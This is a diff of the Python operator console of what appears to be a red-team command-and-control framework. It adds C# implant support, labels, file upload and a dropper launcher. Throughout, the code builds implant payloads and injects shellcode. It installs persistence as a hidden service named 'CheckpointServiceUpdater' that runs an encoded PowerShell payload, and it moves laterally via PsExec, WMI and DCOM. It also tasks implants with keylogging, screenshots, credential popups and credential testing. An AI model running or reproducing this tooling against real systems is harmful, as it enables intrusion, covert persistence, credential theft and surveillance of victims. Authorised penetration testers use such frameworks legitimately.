@@ -1,11 +1,11 @@
 #!/usr/bin/python
  
-import os, time, readline, base64, re, traceback, glob, sys, argparse, shlex, signal
+import os, time, readline, base64, re, traceback, glob, sys, argparse, shlex, signal, subprocess
 import datetime
 from datetime import datetime, timedelta
 from sqlite3 import Error
 from Help import *
-from AutoLoads import * 
+from AutoLoads import *
 from DB import *
 from Colours import *
 from Config import *
@@ -21,12 +21,12 @@ def createproxypayload():
   proxyuser = raw_input("Proxy User: e.g. Domain\\user ")
   proxypass = raw_input("Proxy Password: e.g. Password1 ")
   proxyurl = raw_input("Proxy URL: .e.g. http://10.150.10.1:8080 ")
-  credsexpire = raw_input("Password/Account Expiration Date: .e.g. 15/03/2018 ")  
+  credsexpire = raw_input("Password/Account Expiration Date: .e.g. 15/03/2018 ")
   update_item("ProxyURL", "C2Server", proxyurl)
   update_item("ProxyUser", "C2Server", proxyuser)
   update_item("ProxyPass", "C2Server", proxypass)
   C2 = get_c2server_all()
-  newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12], 
+  newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
     C2[13], C2[11], "", "", C2[19], C2[20],
     C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
   newPayload.CreateRaw("Proxy")
@@ -46,14 +46,14 @@ def createdaisypayload():
   daisyhost = get_implantbyid(daisyhostid)
   proxynone = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
   C2 = get_c2server_all()
-  newPayload = Payloads(C2[5], C2[2], daisyurl, "", daisyport, "", "", "", 
+  newPayload = Payloads(C2[5], C2[2], daisyurl, "", daisyport, "", "", "",
     "", proxynone, C2[19], C2[20],
     C2[21], "%s?d" % get_newimplanturl(), PayloadsDirectory)
   newPayload.C2Core = (newPayload.C2Core).replace("$pid;%s" % (daisyurl+":"+daisyport),"$pid;%s@%s" % (daisyhost[11],daisyhost[3]))
   newPayload.CreateRaw(name)
   newPayload.CreateDlls(name)
-  newPayload.CreateShellcode(name) 
-  newPayload.CreateEXE(name) 
+  newPayload.CreateShellcode(name)
+  newPayload.CreateEXE(name)
   newPayload.CreateMsbuild(name)
   new_urldetails( name, C2[1], C2[3], domain, daisyurl, daisyhostid, "" )
   startup("Created new %s daisy payloads" % name)
@@ -78,7 +78,7 @@ def createnewpayload():
     domainbase = "%s%s" % (randomid,domainbase)
     imurl = get_newimplanturl()
   C2 = get_c2server_all()
-  newPayload = Payloads(C2[5], C2[2], domain, domainfront, C2[8], proxyuser, 
+  newPayload = Payloads(C2[5], C2[2], domain, domainfront, C2[8], proxyuser,
     proxypass, proxyurl, "", "", C2[19], C2[20],
     C2[21], imurl, PayloadsDirectory)
   newPayload.CreateRaw("%s_" % domainbase)
@@ -92,11 +92,11 @@ def createnewpayload():
 
 def argp(cmd):
   args = ""
-  try: 
+  try:
     parser = argparse.ArgumentParser(add_help=False)
     parser.add_argument('-Help', '-help', '-h', action='store', dest='help', required=False)
     parser.add_argument('-Source', '-source', action='store', dest='source', required=True)
-    parser.add_argument('-Destination', '-destination', action='store', dest='destination', required=True)    
+    parser.add_argument('-Destination', '-destination', action='store', dest='destination', required=True)
     parser.add_argument('-NotHidden', '-nothidden', action='store', dest='nothidden', required=False)
     args, unknown = parser.parse_known_args(shlex.split(cmd))
   except:
@@ -106,6 +106,14 @@ def argp(cmd):
 def filecomplete(text, state):
   os.chdir(PayloadsDirectory)
   return (glob.glob(text+'*')+[None])[state]
+
+def readfile_with_completion(message):
+  readline.set_completer(filecomplete)
+  path = raw_input(message)
+  t = tabCompleter()
+  t.createListCompleter(COMMANDS)
+  readline.set_completer(t.listCompleter)
+  return path
 
 def complete(text, state):
   for cmd in COMMANDS:
@@ -118,7 +126,7 @@ def complete(text, state):
 def load_file( location ):
   fr = None
   try:
-    file = open((location), "rb") 
+    file = open((location), "rb")
     fr = file.read()
   except Exception as e:
     print ("Error loading file %s" % e)
@@ -142,12 +150,12 @@ def migrate(randomuri, params=""):
     shellcodefile = load_file("%s/payloads/Posh-shellcode_x%s.bin" % (ROOTDIR,arch))
   elif implant_comms == "Daisy":
     daisyname = raw_input("Name required: ")
-    shellcodefile = load_file("%s/payloads/%sPosh-shellcode_x%s.bin" % (ROOTDIR,daisyname,arch))   
+    shellcodefile = load_file("%s/payloads/%sPosh-shellcode_x%s.bin" % (ROOTDIR,daisyname,arch))
   elif implant_comms == "Proxy":
     shellcodefile = load_file("%s/payloads/ProxyPosh-shellcode_x%s.bin" % (ROOTDIR,arch))
 
   check_module_loaded("Inject-Shellcode.ps1", randomuri)
-  new_task("$Shellcode%s=\"%s\"" % (arch,base64.b64encode(shellcodefile)), randomuri)  
+  new_task("$Shellcode%s=\"%s\"" % (arch,base64.b64encode(shellcodefile)), randomuri)
   new_task("Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode%s))%s" % (arch, params), randomuri)
 
 def startup(printhelp = ""):
@@ -176,22 +184,30 @@ def startup(printhelp = ""):
         PID = i[8]
         Pivot = i[15]
         Sleep = i[13]
+        Label = i[16]
         if Pivot == "Daisy": Pivot = "D"
+        elif Pivot == "C#": Pivot = "C#"
         elif Pivot == "Proxy": Pivot = "P"
-        else: Pivot = ""
+        elif Pivot == "Python": Pivot = "PY"
+        elif Pivot == "OSX": Pivot = "PY"
+        else: Pivot = "PS"
 
         from datetime import datetime, timedelta
         LastSeenTime = datetime.strptime(LastSeen,"%m/%d/%Y %H:%M:%S")
         now = datetime.now()
         nowplus10 = now - timedelta(minutes=10)
         nowplus60 = now - timedelta(minutes=59)
-        
-        if nowplus60 > LastSeenTime:
-          print (Colours.RED + "[%s]: Seen:%s | PID:%s | S:%s | %s @ %s (%s) %s" % (ID, LastSeen, PID.ljust(5), Sleep, DomainUser, Hostname, Arch, Pivot))
-        elif nowplus10 > LastSeenTime:
-          print (Colours.YELLOW + "[%s]: Seen:%s | PID:%s | S:%s | %s @ %s (%s) %s" % (ID, LastSeen, PID.ljust(5), Sleep, DomainUser, Hostname, Arch, Pivot))
+        sID = "["+str(ID)+"]"
+        if Label == None:
+          sLabel = ""
         else:
-          print (Colours.GREEN + "[%s]: Seen:%s | PID:%s | S:%s | %s @ %s (%s) %s" % (ID, LastSeen, PID.ljust(5), Sleep, DomainUser, Hostname, Arch, Pivot))
+          sLabel = "["+Label+"]"
+        if nowplus60 > LastSeenTime:
+          print (Colours.RED + "%s%s: Seen:%s | PID:%s | %s | %s @ %s (%s) %s" % (sID.ljust(4), sLabel, LastSeen, PID.ljust(5), Sleep, DomainUser, Hostname, Arch, Pivot))
+        elif nowplus10 > LastSeenTime:
+          print (Colours.YELLOW + "%s%s: Seen:%s | PID:%s | %s | %s @ %s (%s) %s" % (sID.ljust(4), sLabel, LastSeen, PID.ljust(5), Sleep, DomainUser, Hostname, Arch, Pivot))
+        else:
+          print (Colours.GREEN + "%s%s: Seen:%s | PID:%s | %s | %s @ %s (%s) %s" % (sID.ljust(4), sLabel, LastSeen, PID.ljust(5), Sleep, DomainUser, Hostname, Arch, Pivot))
     else:
       from datetime import datetime, timedelta
       now = datetime.now()
@@ -302,16 +318,16 @@ def startup(printhelp = ""):
         hostname = get_implantdetails(t[2])
         if hostname[2] not in users:
           users += "%s \n" % hostname[2]
-        if "Upload-File" in t[3]:          
+        if "Upload-File" in t[3]:
           uploadedfile = t[3]
           uploadedfile = uploadedfile.partition("estination ")[2]
           uploadedfile = uploadedfile.partition(" -Base64")[0]
-          uploads += "%s %s \n" % (hostname[3], uploadedfile)   
+          uploads += "%s %s \n" % (hostname[3], uploadedfile)
         if "Installing persistence" in t[4]:
           hostname = get_implantdetails(t[2])
           line = t[4].replace('\n','')
           line = line.replace('\r','')
-          filenameuploaded = line.rstrip().split(":",1)[1] 
+          filenameuploaded = line.rstrip().split(":",1)[1]
           uploads += "%s %s \n" % (hostname[3], filenameuploaded)
       startup("Users Compromised: \n%s\nHosts Compromised: \n%s\nURLs: \n%s\nFiles Uploaded: \n%s" % (users, hosts, urls, uploads))
     if "listmodules" in implant_id.lower():
@@ -323,7 +339,8 @@ def startup(printhelp = ""):
       startup("creds module not implemented yet")
 
     if (implant_id.lower() == "pwnself" ) or (implant_id.lower() == "p"):
-      startup("Cannot pwnself on Unix :)\r\n")
+      subprocess.Popen(["python", "%s%s" % (PayloadsDirectory, "py_dropper.py")])
+      startup()
 
     if (implant_id.lower() == "tasks" ) or (implant_id.lower() == "tasks "):
       alltasks = ""
@@ -380,7 +397,7 @@ def startup(printhelp = ""):
       time.sleep(10)
       startup()
 
-def runcommand(command, randomuri): 
+def runcommand(command, randomuri):
   if command:
     try:
       last = get_lastcommand()
@@ -393,7 +410,7 @@ def runcommand(command, randomuri):
       ExError = e
 
   implant_type = get_implanttype(randomuri)
-  if implant_type == "OSX":     
+  if implant_type == "OSX":
     if 'beacon' in command.lower() or 'set-beacon' in command.lower() or 'setbeacon' in command.lower():
       command = command.replace('set-beacon ', '')
       command = command.replace('setbeacon ', '')
@@ -414,6 +431,11 @@ def runcommand(command, randomuri):
       sleep = '$sleeptime = %s' % command
       update_sleep(command, randomuri)
       new_task(sleep, randomuri)
+
+    elif (command.lower().startswith('label-implant')):
+        label = command.replace('label-implant ', '')
+        update_label(label, randomuri)
+        startup()
 
     elif "searchhelp" in command.lower():
       searchterm = (command.lower()).replace("searchhelp ","")
@@ -436,21 +458,31 @@ def runcommand(command, randomuri):
       source = ""
       destination = ""
       s = ""
-      args = argp(command)
+      if command.strip().lower() == "upload-file":
+        source = readfile_with_completion("Location of file to upload: ")
+        while not os.path.isfile(source):
+          print("File does not exist: %s" % source)
+          source = readfile_with_completion("Location of file to upload: ")
+        destination = raw_input("Location to upload to: ")
+      else:
+        args = argp(command)
+        source = args.source
+        destination = args.destination
       try:
-        if args:
-          with open(args.source, "rb") as source_file:
-            s = source_file.read()
-            source = base64.b64encode(s)
+        with open(source, "rb") as source_file:
+          s = source_file.read()
         if s:
-          destination = args.destination.replace("\\","\\\\")
+          sourceb64 = base64.b64encode(s)
+          destination = destination.replace("\\","\\\\")
           print ("")
-          print ("Uploading %s to %s" % (args.source, destination))
-          uploadcommand = "upload-file \"%s\":%s" % (destination, source)
+          print ("Uploading %s to %s" % (source, destination))
+          uploadcommand = "upload-file \"%s\":%s" % (destination, sourceb64)
           new_task(uploadcommand, randomuri)
+        else:
+          print("Source file could not be read or was empty")
       except Exception as e:
         print ("Error with source file: %s" % e   )
-        traceback.print_exc()  
+        traceback.print_exc()
 
     elif command.lower() == "help" or command == "?" or command.lower() == "help ":
       print (py_help1)
@@ -484,13 +516,203 @@ def runcommand(command, randomuri):
         kill_implant(randomuri)
 
     elif (command == "back") or (command == "clear") or (command == "back ") or (command == "clear "):
-      startup() 
+      startup()
+    
+    elif "linuxprivchecker" in command.lower():
+      params = re.compile("linuxprivchecker", re.IGNORECASE)
+      params = params.sub("", command)
+      module = open("%slinuxprivchecker.py" % ModulesDirectory, 'r').read()
+      encoded_module = base64.b64encode(module)
+      taskcmd = "linuxprivchecker -pycode %s %s" % (encoded_module, params)
+      new_task(taskcmd, randomuri)
 
     else:
       if command:
         new_task(command, randomuri)
       return
 
+  elif implant_type == "C#":
+      try:
+        check_module_loaded("Core.exe", randomuri)
+      except Exception as e:
+        print ("Error loading Core.exe: %s" % e)
+        
+      if "searchhelp" in command.lower():
+        searchterm = (command.lower()).replace("searchhelp ","")
+        import string
+        helpfull = string.split(sharp_help1, '\n')
+        for line in helpfull:
+          if searchterm in line:
+            print (line)
+
+      elif "upload-file" in command.lower():
+        source = ""
+        destination = ""
+        s = ""
+        if command.strip().lower() == "upload-file":
+          source = readfile_with_completion("Location of file to upload: ")
+          while not os.path.isfile(source):
+            print("File does not exist: %s" % source)
+            source = readfile_with_completion("Location of file to upload: ")
+          destination = raw_input("Location to upload to: ")
+        else:
+          args = argp(command)
+          source = args.source
+          destination = args.destination
+        try:
+          with open(source, "rb") as source_file:
+            s = source_file.read()
+          if s:
+            sourceb64 = base64.b64encode(s)
+            destination = destination.replace("\\","\\\\")
+            print ("")
+            print ("Uploading %s to %s" % (source, destination))
+            uploadcommand = "upload-file%s;\"%s\"" % (sourceb64, destination)
+            new_task(uploadcommand, randomuri)
+          else:
+            print("Source file could not be read or was empty")
+        except Exception as e:
+          print ("Error with source file: %s" % e   )
+          traceback.print_exc()
+
+      elif "unhide-implant" in command.lower():
+        unhide_implant(randomuri)
+
+      elif "hide-implant" in command.lower():
+        kill_implant(randomuri)
+
+      elif "inject-shellcode" in command.lower():
+        params = re.compile("inject-shellcode", re.IGNORECASE)
+        params = params.sub("", command)
+        path = readfile_with_completion("Location of shellcode file: ")
+        try:
+          shellcodefile = load_file(path)
+          if shellcodefile != None:
+            arch = "64"
+            new_task("run-exe Core.Program Core Inject-Shellcode %s%s" % (base64.b64encode(shellcodefile),params), randomuri)
+        except Exception as e:
+          print ("Error loading file: %s" % e)
+
+      elif "kill-implant" in command.lower() or "exit" in command.lower():
+        impid = get_implantdetails(randomuri)
+        ri = raw_input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid[0])
+        if ri.lower() == "n":
+          print ("Implant not terminated")
+        if ri == "":
+          new_task("exit",randomuri)
+          kill_implant(randomuri)
+        if ri.lower() == "y":
+          new_task("exit",randomuri)
+          kill_implant(randomuri)
+    
+      elif "seatbelt " in command.lower():
+        check_module_loaded("Seatbelt.exe", randomuri)
+        new_task(command,randomuri)
+
+      elif (command.lower().startswith("stop-keystrokes")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+        
+      elif (command.lower().startswith("get-keystrokes")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+
+      elif (command.lower().startswith("get-screenshotmulti")):
+        new_task(command,randomuri)
+
+      elif (command.lower().startswith("get-screenshot")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+        
+      elif (command.lower().startswith("arpscan")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+  
+      elif (command.lower().startswith("testadcredential")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+          
+      elif (command.lower().startswith("testlocalcredential")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+
+      elif (command.lower().startswith("turtle")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+        
+      elif (command.lower().startswith("get-userinfo")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+                    
+      elif (command.lower().startswith("get-content")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+                    
+      elif (command.lower().startswith("resolvednsname")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+          
+      elif (command.lower().startswith("resolveip")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+                  
+      elif (command.lower().startswith("cred-popper")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+
+      elif (command.lower().startswith("get-serviceperms")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+
+      elif (command.lower().startswith("move")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+        
+      elif (command.lower().startswith("delete")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+      
+      elif (command.lower().startswith("ls")):
+        new_task("run-exe Core.Program Core %s" % command,randomuri)
+                    
+      elif (command.lower() == "pwd") or (command.lower() == "pwd "):
+        new_task("run-exe Core.Program Core pwd",randomuri)
+          
+      elif (command.lower() == "ps") or (command.lower() == "ps "):
+        new_task("run-exe Core.Program Core Get-ProcessList",randomuri)
+
+      elif "loadmoduleforce" in command.lower():
+        params = re.compile("loadmoduleforce ", re.IGNORECASE)
+        params = params.sub("", command)
+        check_module_loaded(params, randomuri, force=True)
+  
+      elif "loadmodule" in command.lower():
+        params = re.compile("loadmodule ", re.IGNORECASE)
+        params = params.sub("", command)
+        check_module_loaded(params, randomuri)
+
+      elif "listmodules" in command.lower():
+        modules = os.listdir("%s/Modules/" % POSHDIR)
+        print ("")
+        print ("[+] Available modules:")
+        print ("")
+        for mod in modules:
+          if (".exe" in mod) or (".dll" in mod) :
+            print (mod)
+        new_task(command,randomuri)
+  
+      elif "modulesloaded" in command.lower():
+        ml = get_implantdetails(randomuri)
+        print (ml[14])
+      
+      elif command.lower() == "help" or command == "?" or command.lower() == "help ":
+        print (sharp_help1)
+      
+      elif (command == "back") or (command == "clear") or (command == "back ") or (command == "clear "):
+        startup()
+        
+      elif ('beacon' in command.lower() and '-beacon' not in command.lower()) or 'set-beacon' in command.lower() or 'setbeacon' in command.lower():
+        new_task(command, randomuri)
+        command = command.replace('set-beacon ', '')
+        command = command.replace('setbeacon ', '')
+        command = command.replace('beacon ', '')
+        update_sleep(command, randomuri)
+
+      elif (command.lower().startswith('label-implant')):
+        label = command.replace('label-implant ', '')
+        update_label(label, randomuri)
+        startup()
+            
+      else:
+        if command:
+          new_task(command, randomuri)
+        return
+      
   else:
     try:
       check_module_loaded("Implant-Core.ps1", randomuri)
@@ -505,6 +727,11 @@ def runcommand(command, randomuri):
       command = command.replace('setbeacon ', '')
       command = command.replace('beacon ', '')
       update_sleep(command, randomuri)
+
+    elif (command.lower().startswith('label-implant')):
+        label = command.replace('label-implant ', '')
+        update_label(label, randomuri)
+        startup()
 
     elif "searchhelp" in command.lower():
       searchterm = (command.lower()).replace("searchhelp ","")
@@ -522,24 +749,24 @@ def runcommand(command, randomuri):
       if C2[11] == "":
         startup("Need to run createproxypayload first")
       else:
-        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12], 
+        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
             C2[13], C2[11], "", "", C2[19], C2[20],
             C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
         payload = newPayload.CreateRawBase()
-        cmd = "sc.exe create CPUpdater binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)      
+        cmd = "sc.exe create CPUpdater binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)
         new_task(cmd, randomuri)
 
     elif "install-servicelevel-persistence" in command.lower():
       C2 = get_c2server_all()
-      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "", 
+      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
           "", "", "", "", C2[19], C2[20],
           C2[21], get_newimplanturl(), PayloadsDirectory)
       payload = newPayload.CreateRawBase()
-      cmd = "sc.exe create CPUpdater binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)      
+      cmd = "sc.exe create CPUpdater binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)
       new_task(cmd, randomuri)
       
     elif "remove-servicelevel-persistence" in command.lower():
-      new_task("sc.exe delete CPUpdater", randomuri) 
+      new_task("sc.exe delete CPUpdater", randomuri)
 
     # psexec lateral movement
     elif "get-implantworkingdirectory" in command.lower():
@@ -550,7 +777,7 @@ def runcommand(command, randomuri):
       if C2[11] == "":
         startup("Need to run createproxypayload first")
       else:
-        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12], 
+        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
             C2[13], C2[11], "", "", C2[19], C2[20],
             C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
         payload = newPayload.CreateRawBase()
@@ -564,7 +791,7 @@ def runcommand(command, randomuri):
     elif "get-system-withdaisy" in command.lower():
       C2 = get_c2server_all()
       daisyname = raw_input("Payload name required: ")
-      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))): 
+      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))):
         with open("%s%spayload.bat" % (PayloadsDirectory,daisyname), "r") as p: payload = p.read()
         cmd =  "sc.exe create CPUpdaterMisc binpath= 'cmd /c %s' Displayname= CheckpointServiceModule start= auto" % payload
         new_task(cmd, randomuri)
@@ -575,7 +802,7 @@ def runcommand(command, randomuri):
 
     elif "get-system" in command.lower():
       C2 = get_c2server_all()
-      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "", 
+      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
           "", "", "", "", C2[19], C2[20],
           C2[21], get_newimplanturl(), PayloadsDirectory)
       payload = newPayload.CreateRawBase()
@@ -601,7 +828,7 @@ def runcommand(command, randomuri):
       if C2[11] == "":
         startup("Need to run createproxypayload first")
       else:
-        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12], 
+        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
             C2[13], C2[11], "", "", C2[19], C2[20],
             C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
         payload = newPayload.CreateRawBase()
@@ -613,7 +840,7 @@ def runcommand(command, randomuri):
     elif "invoke-psexecdaisypayload" in command.lower():
       check_module_loaded("Invoke-PsExec.ps1", randomuri)
       daisyname = raw_input("Payload name required: ")
-      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))): 
+      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))):
         with open("%s%spayload.bat" % (PayloadsDirectory,daisyname), "r") as p: payload = p.read()
         params = re.compile("invoke-psexecdaisypayload ", re.IGNORECASE)
         params = params.sub("", command)
@@ -625,7 +852,7 @@ def runcommand(command, randomuri):
     elif "invoke-psexecpayload" in command.lower():
       check_module_loaded("Invoke-PsExec.ps1", randomuri)
       C2 = get_c2server_all()
-      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "", 
+      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
           "", "", "", "", C2[19], C2[20],
           C2[21], get_newimplanturl(), PayloadsDirectory)
       payload = newPayload.CreateRawBase()
@@ -642,7 +869,7 @@ def runcommand(command, randomuri):
       if C2[11] == "":
         startup("Need to run createproxypayload first")
       else:
-        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12], 
+        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
             C2[13], C2[11], "", "", C2[19], C2[20],
             C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
         payload = newPayload.CreateRawBase()
@@ -654,7 +881,7 @@ def runcommand(command, randomuri):
     elif "invoke-wmidaisypayload" in command.lower():
       check_module_loaded("Invoke-WMIExec.ps1", randomuri)
       daisyname = raw_input("Name required: ")
-      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))): 
+      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))):
         with open("%s%spayload.bat" % (PayloadsDirectory,daisyname), "r") as p: payload = p.read()
         params = re.compile("invoke-wmidaisypayload ", re.IGNORECASE)
         params = params.sub("", command)
@@ -666,7 +893,7 @@ def runcommand(command, randomuri):
     elif "invoke-wmipayload" in command.lower():
       check_module_loaded("Invoke-WMIExec.ps1", randomuri)
       C2 = get_c2server_all()
-      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "", 
+      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
           "", "", "", "", C2[19], C2[20],
           C2[21], get_newimplanturl(), PayloadsDirectory)
       payload = newPayload.CreateRawBase()
@@ -679,7 +906,7 @@ def runcommand(command, randomuri):
 
     elif "invoke-dcomproxypayload" in command.lower():
       C2 = get_c2server_all()
-      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12], 
+      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
         C2[13], C2[11], "", "", C2[19], C2[20],
         C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
       payload = newPayload.CreateRawBase()
@@ -690,7 +917,7 @@ def runcommand(command, randomuri):
 
     elif "invoke-dcomdaisypayload" in command.lower():
       daisyname = raw_input("Name required: ")
-      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))): 
+      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))):
         with open("%s%spayload.bat" % (PayloadsDirectory,daisyname), "r") as p: payload = p.read()
         p = re.compile(ur'(?<=-target.).*')
         target = re.search(p, command).group()
@@ -701,7 +928,7 @@ def runcommand(command, randomuri):
 
     elif "invoke-dcompayload" in command.lower():
       C2 = get_c2server_all()
-      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "", 
+      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
           "", "", "", "", C2[19], C2[20],
           C2[21], get_newimplanturl(), PayloadsDirectory)
       payload = newPayload.CreateRawBase()
@@ -714,7 +941,7 @@ def runcommand(command, randomuri):
 
     elif "invoke-runasdaisypayload" in command.lower():
       daisyname = raw_input("Name required: ")
-      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))): 
+      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))):
         with open("%s%spayload.bat" % (PayloadsDirectory,daisyname), "r") as p: payload = p.read()
         new_task("$proxypayload = \"%s\"" % payload, randomuri)
         check_module_loaded("Invoke-RunAs.ps1", randomuri)
@@ -732,7 +959,7 @@ def runcommand(command, randomuri):
       if C2[11] == "":
         startup("Need to run createproxypayload first")
       else:
-        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12], 
+        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
             C2[13], C2[11], "", "", C2[19], C2[20],
             C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
         payload = newPayload.CreateRawBase()
@@ -766,13 +993,13 @@ def runcommand(command, randomuri):
     elif command.lower() == "help 4":
       print (posh_help4)
     elif command.lower() == "help 5":
-      print (posh_help5)  
+      print (posh_help5)
     elif command.lower() == "help 6":
       print (posh_help6)
     elif command.lower() == "help 7":
       print (posh_help7)
     elif command.lower() == "help 8":
-      print (posh_help8)   
+      print (posh_help8)
 
 
     elif "get-pid" in command.lower():
@@ -783,24 +1010,36 @@ def runcommand(command, randomuri):
       source = ""
       destination = ""
       s = ""
-      args = argp(command)
+      nothidden = False
+      if command.strip().lower() == "upload-file":
+        source = readfile_with_completion("Location of file to upload: ")
+        while not os.path.isfile(source):
+          print("File does not exist: %s" % source)
+          source = readfile_with_completion("Location of file to upload: ")
+        destination = raw_input("Location to upload to: ")
+      else:
+        args = argp(command)
+        source = args.source
+        destination = args.destination
+        nothidden = args.nothidden
       try:
-        if args:
-          with open(args.source, "rb") as source_file:
-            s = source_file.read()
-            source = base64.b64encode(s)
+        with open(source, "rb") as source_file:
+          s = source_file.read()
         if s:
-          destination = args.destination.replace("\\","\\\\")
+          sourceb64 = base64.b64encode(s)
+          destination = destination.replace("\\","\\\\")
           print ("")
-          print ("Uploading %s to %s" % (args.source, destination))
-          if (args.nothidden):
-            uploadcommand = "Upload-File -Destination \"%s\" -NotHidden %s -Base64 %s" % (destination, args.nothidden, source)
+          print ("Uploading %s to %s" % (source, destination))
+          if (nothidden):
+            uploadcommand = "Upload-File -Destination \"%s\" -NotHidden %s -Base64 %s" % (destination, nothidden, sourceb64)
           else:
-            uploadcommand = "Upload-File -Destination \"%s\" -Base64 %s" % (destination, source)             
+            uploadcommand = "Upload-File -Destination \"%s\" -Base64 %s" % (destination, sourceb64)
           new_task(uploadcommand, randomuri)
+        else:
+          print("Source file could not be read or was empty")
       except Exception as e:
-        print ("Error with source file: %s" % e)   
-        traceback.print_exc()      
+        print ("Error with source file: %s" % e   )
+        traceback.print_exc()
 
     elif "kill-implant" in command.lower() or "exit" in command.lower():
       impid = get_implantdetails(randomuri)
@@ -855,15 +1094,15 @@ def runcommand(command, randomuri):
         shellcodefile = load_file(path)
         if shellcodefile != None:
           arch = "64"
-          new_task("$Shellcode%s=\"%s\"" % (arch,base64.b64encode(shellcodefile)), randomuri)  
+          new_task("$Shellcode%s=\"%s\"" % (arch,base64.b64encode(shellcodefile)), randomuri)
           new_task("Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode%s))%s" % (arch, params), randomuri)
       except Exception as e:
         print ("Error loading file: %s" % e)
 
-    elif "listmodules" in command.lower():    
+    elif "listmodules" in command.lower():
       print (os.listdir("%s/Modules/" % POSHDIR))
 
-    elif "modulesloaded" in command.lower():    
+    elif "modulesloaded" in command.lower():
       ml = get_implantdetails(randomuri)
       print (ml[14])
 
@@ -925,7 +1164,12 @@ def commandloop(implant_id):
       else:
         hostname = get_hostdetails(implant_id)
         if hostname[15] == 'OSX':
-          t.createListCompleter(UXCOMMANDS  )
+          t.createListCompleter(UXCOMMANDS)
+          readline.set_completer_delims('\t')
+          readline.parse_and_bind("tab: complete")
+          readline.set_completer(t.listCompleter)
+        if hostname[15] == 'C#':
+          t.createListCompleter(SHARPCOMMANDS)
           readline.set_completer_delims('\t')
           readline.parse_and_bind("tab: complete")
           readline.set_completer(t.listCompleter)
@@ -956,7 +1200,7 @@ def commandloop(implant_id):
             runcommand(command, implant_id)
           except Exception as e:
             print ("Unknown ImplantID")
-      # else run against single uri    
+      # else run against single uri
       else:
         implant_id = get_randomuri(implant_id)
         runcommand(command, implant_id)
